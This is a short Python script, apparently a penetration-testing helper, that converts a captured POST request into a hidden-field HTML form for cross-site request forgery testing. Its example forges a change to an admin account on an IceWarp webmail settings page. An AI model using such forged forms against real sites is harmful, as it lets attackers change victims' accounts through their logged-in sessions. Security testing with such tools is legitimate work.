#!/usr/bin/python

"""
turns a captured POST request (such as in burp) similar to the following...

POST /mail/accountsettings_add.html HTTP/1.1
Host: 1.2.3.4:32000
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.98.182:32000/mail/accountsettingsaction.html
Cookie: IceWarpWebMailSessID=4cc1dc35b0bf6a51380f33443c8a9a0a
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 323

id=38d310a3f54ea92d8d8619caafe1c522&accountid=0&Save_x=1&action=mod&account%5BUSER%5D=victim.com%2Fadmin&account%5BEMAIL%5D=admin%40victim.com&account%5BPASS%5D=*****&account%5BPASS2%5D=*****&account%5BFULLNAME%5D=Admin&account%5BALTEMAIL%5D=&account%5BHOSTUSER%5D=victim.com%2Fadmin&account%5BCOLOR%5D=&Save_x=Save+Changes

... into a html formatted form ...
root@kali:~# python request2form.py requestfile

<HTML>
<form method=POST name="frm1" action="/mail/accountsettings_add.html">
<input type="hidden" name="id" value="38d310a3f54ea92d8d8619caafe1c522">
<input type="hidden" name="accountid" value="0">
<input type="hidden" name="Save_x" value="1">
<input type="hidden" name="action" value="mod">
<input type="hidden" name="account[USER]" value="victim.com/admin">
<input type="hidden" name="account[EMAIL]" value="admin@victim.com">
<input type="hidden" name="account[PASS]" value="*****">
<input type="hidden" name="account[PASS2]" value="*****">
<input type="hidden" name="account[FULLNAME]" value="Admin">
<input type="hidden" name="account[ALTEMAIL]" value="">
<input type="hidden" name="account[HOSTUSER]" value="victim.com/admin">
<input type="hidden" name="account[COLOR]" value="">
<input type="hidden" name="Save_x" value="Save+Changes">
</form>
</html>

"""

import sys, urllib

def usage():
	print("[!] usage: %s <requestFile>"%sys.argv[0])
	print("[!]  turns a raw POST request file into a html form")
	exit(-1)

if not (len(sys.argv) == 2):
	usage()

infile = sys.argv[1]
inContents = ""
inList = []
formurl = ""

try:
	inContents = open(infile).read()
except IOError:
	print "[!] error reading file '%s', exiting..."%infile
	exit(-1)

inList	 = inContents.split("\n")
formData = urllib.unquote(inList[-1]).split("&")
host	 = ""

for line in inList:
	if line.lower().startswith("host: "):
		host = line[5:].strip()
		break

if (inList[0].startswith("POST")):
	formurl = inList[0].split(" ")[1].strip() # get the url the request is going to

output = []
output.append("<HTML>")
output.append('<form method=POST name="frm1" action="http://%s%s">'%(host,formurl))

for field in formData:
	output.append('<input type="hidden" name="%s" value="%s">'%(field.split("=")[0],field.split("=")[1]))

output.append("</form>")
output.append("</html>")

for x in output:
	print x
